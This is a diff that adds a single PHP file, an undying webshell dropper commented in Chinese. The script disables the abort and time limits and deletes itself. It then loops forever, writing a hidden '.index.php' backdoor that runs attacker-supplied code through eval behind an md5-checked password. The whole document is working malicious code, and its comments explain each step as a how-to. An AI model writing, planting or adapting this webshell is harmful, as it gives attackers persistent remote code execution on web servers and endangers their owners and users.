@@ -1,0 +1,1 @@
+<?php ignore_user_abort(true);//不死马的关键，可以写进进程不被杀死set_time_limit(0);//设置所有时间都能执行unlink(__FILE__);//隐藏删除自己，接下来用不死马文件就行了$file = '.index.php';//文件名$code = '<?php if(md5($_POST["pass"])=="21232f297a57a5a743894a0e4a801fc3"){@eval($_POST[a]);} ?>';//后门内容，设置md5密码防止别人利用while (1){  //while死循环写入后门！    file_put_contents($file,$code);//写后门函数    usleep(5000);//间隔时间}?>
